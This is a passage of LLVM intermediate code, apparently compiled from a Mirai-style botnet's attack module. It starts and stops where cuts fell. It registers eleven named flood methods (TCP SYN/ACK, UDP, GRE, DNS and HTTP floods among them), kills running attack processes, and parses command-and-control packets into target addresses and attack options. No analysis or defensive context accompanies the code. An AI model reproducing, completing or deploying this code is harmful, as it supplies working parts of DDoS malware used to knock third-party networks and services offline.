0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcp)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greip)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greeth)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udprandom)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpsyn)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstorm)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #7
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #7
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #7
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %6 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #7
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #7
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %16 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %20, label %18

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @kill(i32 %16, i32 9) #7
  br label %20

; <label>:20:                                     ; preds = %18, %15
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %21 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %25, label %23

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @kill(i32 %21, i32 9) #7
  br label %25

; <label>:25:                                     ; preds = %23, %20
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %26 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %30, label %28

; <label>:28:                                     ; preds = %25
  %29 = tail call i32 @kill(i32 %26, i32 9) #7
  br label %30

; <label>:30:                                     ; preds = %28, %25
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %31 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #7
  br label %35

; <label>:35:                                     ; preds = %33, %30
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %36 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = tail call i32 @kill(i32 %36, i32 9) #7
  br label %40

; <label>:40:                                     ; preds = %38, %35
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %41 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %45, label %43

; <label>:43:                                     ; preds = %40
  %44 = tail call i32 @kill(i32 %41, i32 9) #7
  br label %45

; <label>:45:                                     ; preds = %43, %40
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %46 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %45
  %49 = tail call i32 @kill(i32 %46, i32 9) #7
  br label %50

; <label>:50:                                     ; preds = %48, %45
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %51 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %50
  %54 = tail call i32 @kill(i32 %51, i32 9) #7
  br label %55

; <label>:55:                                     ; preds = %53, %50
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %56 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %58

; <label>:58:                                     ; preds = %55
  %59 = tail call i32 @kill(i32 %56, i32 9) #7
  br label %60

; <label>:60:                                     ; preds = %58, %55
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %61 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %63

; <label>:63:                                     ; preds = %60
  %64 = tail call i32 @kill(i32 %61, i32 9) #7
  br label %65

; <label>:65:                                     ; preds = %63, %60
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %66 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %70, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @kill(i32 %66, i32 9) #7
  br label %70

; <label>:70:                                     ; preds = %68, %65
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %71 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @kill(i32 %71, i32 9) #7
  br label %75

; <label>:75:                                     ; preds = %73, %70
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #8
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #7
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #7
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
